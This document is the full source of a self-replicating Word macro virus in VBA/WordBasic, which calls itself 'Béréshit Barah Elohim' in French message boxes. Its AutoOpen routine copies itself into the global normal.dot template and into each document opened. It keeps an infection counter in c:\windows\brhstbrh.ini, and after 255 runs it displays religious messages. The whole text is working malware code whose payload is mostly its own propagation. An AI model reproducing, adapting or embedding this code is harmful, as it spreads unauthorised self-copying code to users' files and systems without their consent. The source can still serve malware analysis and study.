   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "AutoOpen"

   Public Sub MAIN()
   Dim rép$
   Dim nomc$
   Dim premfen$
   Dim lafen$
   Dim compte
   Dim nom$
   Dim Enterie$
   Dim number$
   Dim ITERATION
   Dim nombre$


   rép$ = WordBasic.[GetPrivateProfileString$]("Microsoft Word", "USER-DOT-PATH", "winword6.ini")

   nomc$ = rép$ + "normal.dot"

   premfen$ = WordBasic.[FileName$]()
   lafen$ = WordBasic.[WindowName$]()


   If UCase(WordBasic.[Right$](premfen$, 10)) = "NORMAL.DOT" Then GoTo end_of

   For compte = 1 To WordBasic.CountMacros(0)
       nom$ = WordBasic.[MacroName$](compte, 0)
   If nom$ = "AutoOpen" Then GoTo passe
   Next compte

   Open "c:\windows\brhstbrh.ini" For Output As 1
   Print #1, "[Entries for MIHOLEH HARAB TIHSHEREB]:"
   Print #1, "1"
   Close 1

   WordBasic.Organizer Copy:=1, Source:=premfen$, Destination:=nomc$, Name:="AutoOpen", Tab:=3

   passe:
   WordBasic.Activate lafen$

   For compte = 1 To WordBasic.CountMacros(1)
       nom$ = WordBasic.[MacroName$](compte, 0)
   If nom$ = "AutoOpen" Then GoTo passetwo
   Next compte

   WordBasic.FileSaveAs Name:=premfen$, Format:=1, LockAnnot:=0, Password:="", AddToMru:=1, WritePassword:="", RecommendReadOnly:=0, EmbedFonts:=0, NativePictureFormat:=0, FormsData:=0

   WordBasic.Organizer Copy:=1, Source:=nomc$, Destination:=premfen$, Name:="AutoOpen", Tab:=3

   passetwo:

   Open "c:\windows\brhstbrh.ini" For Input As 1
   Input #1, Enterie$
   Input #1, number$
   Close 1

   ITERATION = WordBasic.Val(number$) + 1
   nombre$ = Str(ITERATION)

   Open "c:\windows\brhstbrh.ini" For Output As 1
   Print #1, "[Entries for MIHOLEH HARAB TIHSHEREB]:"
   Print #1, nombre$
   Close 1
   If ITERATION < 255 Then GoTo end_of

   WordBasic.MsgBox "Vous êtes témoin de la présence du ~virus~ Béréshit Barah Elohim dans votre système. © Copyright 1998 JDN-FDD.", "Infos", 64

   WordBasic.MsgBox "Je ne détériorerai point ton disque dur, n'aies crainte ! Mais je veux t'annoncer une bonne nouvelle : le Royaume de Dieu est proche, il est pour ceux qui ont le coeur simple, pour ceux qui se repentent du mal qu'ils ont fait sur la terre.", "Infos.lire->Prophète Esaîe-Chapître 53.Fils  d'Abraham,Ne l'ôte pas de la Torah.", 64

   end_of:

   End Sub
